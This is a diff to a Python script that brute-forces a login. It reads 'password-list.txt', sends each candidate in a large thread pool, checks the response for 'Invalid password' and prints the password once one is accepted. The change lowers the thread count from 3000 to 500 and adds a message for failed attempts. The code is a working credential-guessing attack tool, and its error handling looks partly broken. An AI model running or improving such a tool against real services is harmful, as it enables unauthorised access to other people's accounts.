@@ -26,7 +26,7 @@ def load_object(obj, filename):
 def thread_starter():
     with open('password-list.txt', 'rb') as f:
         passwords = f.read().splitlines()
-    pool = ThreadPool(3000)
+    pool = ThreadPool(500)
     results = pool.map(start, passwords)
     pool.close()
     pool.join()
@@ -38,6 +38,8 @@ def start(password):
     except Exception as e:
         print("Hit exception: " + e + " on password: " + password + ". Retrying.")
         start(password)
+    if 'Invalid password' in r.text:
+        print("Tried password " + password + ". Did not work.")
     else:
         print("### Password is: " + password + " ### ")
         print(r.text)
